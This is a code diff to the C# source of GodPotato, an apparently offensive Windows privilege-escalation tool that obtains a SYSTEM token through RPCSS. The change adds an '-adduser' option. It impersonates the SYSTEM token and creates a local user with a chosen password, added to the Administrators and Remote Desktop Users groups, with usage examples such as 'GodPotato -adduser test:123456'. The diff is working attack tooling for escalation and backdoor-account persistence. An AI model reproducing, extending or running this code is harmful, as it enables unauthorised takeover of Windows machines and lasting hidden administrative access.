@@ -13,8 +13,12 @@ namespace GodPotato
 
         class GodPotatoArgs
         {
-            [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
+            [ArgsAttribute("cmd", "cmd /c whoami", Description = "CommandLine", Required = false)]
             public string cmd { get; set; }
+
+            // 添加用户
+            [ArgsAttribute("adduser", "", Required = false, Description = "添加用户（格式：用户名:密码）")]
+            public string AddUser { get; set; }
         }
 
 
@@ -41,7 +45,11 @@ namespace GodPotato
    FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
     FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
 "
-, "GodPotato", new string[0]);
+, "GodPotato", new string[]
+    {
+        "GodPotato -cmd \"cmd /c whoami\"",
+        "GodPotato -adduser test:123456"
+    });
 
 
             if (args.Length == 0)
@@ -87,7 +95,7 @@ namespace GodPotato
                     ConsoleWriter.WriteLine("[*] Trigger RPCSS");
                     int hr = unmarshalTrigger.Trigger();
                     ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
-                    
+
                 }
                 catch (Exception e)
                 {
@@ -99,13 +107,54 @@ namespace GodPotato
                 if (systemIdentity != null)
                 {
                     ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
-                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);
+                    if (!string.IsNullOrEmpty(potatoArgs.AddUser))
+                    {
+                        // 分割用户名和密码
+                        string[] userParts = potatoArgs.AddUser.Split(new[] { ':' }, 2);
+                        if (userParts.Length != 2)
+                        {
+                            ConsoleWriter.WriteLine("[!] 参数格式错误！正确格式：-adduser 用户名:密码");
+                            return;
+                        }
 
+                        string username = userParts[0];
+                        string password = userParts[1];
+
+                        // 在 SYSTEM 上下文中执行用户添加
+                        systemIdentity.Impersonate(); // 切换到 SYSTEM 令牌
+                        try
+                        {
+                            UserManager.CreateLocalUserWithDirectoryEntry(
+                    ConsoleWriter,
+                    userParts[0],    // 用户名
+                    userParts[1],    // 密码
+                    addToAdministrators: true,
+                    addToRemoteDesktopUsers: true
+                    );
+                        }
+                        catch (Exception ex)
+                        {
+                            ConsoleWriter.WriteLine($"[!] 操作失败: {ex.Message}");
+                        }
+                        finally
+                        {
+                            WindowsIdentity.Impersonate(IntPtr.Zero); // 恢复原上下文
+                        }
+                    }
+                    else if (!string.IsNullOrEmpty(potatoArgs.cmd))
+                    {
+                        // 原有命令执行逻辑
+                        TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);
+                    }
                 }
+
                 else
                 {
+                    // ConsoleWriter.WriteLine("[!] 提权失败，无法获取 SYSTEM 令牌");
                     ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
+
                 }
+
                 godPotatoContext.Restore();
                 godPotatoContext.Stop();
             }
